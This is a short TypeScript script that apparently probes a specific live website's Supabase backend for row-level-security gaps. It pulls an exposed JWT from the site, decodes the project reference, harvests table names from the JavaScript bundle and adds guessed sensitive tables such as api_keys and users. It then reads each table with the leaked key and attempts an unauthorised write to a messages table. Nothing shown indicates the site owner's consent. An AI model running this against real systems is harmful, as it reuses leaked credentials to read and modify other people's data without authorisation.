import { scanUrl } from "../src/scan/scanner.js";

function b64urlJson(part: string): Record<string, unknown> {
  const pad = part + "=".repeat((4 - (part.length % 4)) % 4);
  return JSON.parse(
    Buffer.from(pad.replace(/-/g, "+").replace(/_/g, "/"), "base64").toString("utf8"),
  );
}

const report = await scanUrl("https://aureonai.app/");
const jwt = report.findings.find((f) => f.patternId === "jwt")?.value;
if (!jwt) throw new Error("no jwt");
const ref = String(b64urlJson(jwt.split(".")[1]!).ref);
const base = `https://${ref}.supabase.co`;
const headers = { apikey: jwt, authorization: `Bearer ${jwt}`, accept: "application/json" };

const jsUrl = report.sources.find((s) => s.includes("/assets/index-"));
const js = jsUrl ? await (await fetch(jsUrl)).text() : "";
const tables = new Set<string>();
for (const m of js.matchAll(/\.from\(["']([a-zA-Z0-9_]+)["']\)/g)) tables.add(m[1]!);
console.log("Bundle .from() tables:", [...tables].sort().join(", ") || "(none found)");

const extra = [
  "profiles",
  "messages",
  "projects",
  "users",
  "operators",
  "predictions",
  "datasets",
  "api_keys",
  "organizations",
];
const all = [...new Set([...tables, ...extra])];

for (const table of all) {
  const res = await fetch(`${base}/rest/v1/${table}?select=*&limit=1`, { headers });
  const body = (await res.text()).slice(0, 160).replace(/\s+/g, " ");
  console.log(`${res.status} ${table} ${body}`);
}

// Try write (should fail if RLS good)
const write = await fetch(`${base}/rest/v1/messages`, {
  method: "POST",
  headers: { ...headers, "content-type": "application/json", prefer: "return=minimal" },
  body: JSON.stringify({ probe: true }),
});
console.log(`POST messages => ${write.status} ${(await write.text()).slice(0, 120)}`);
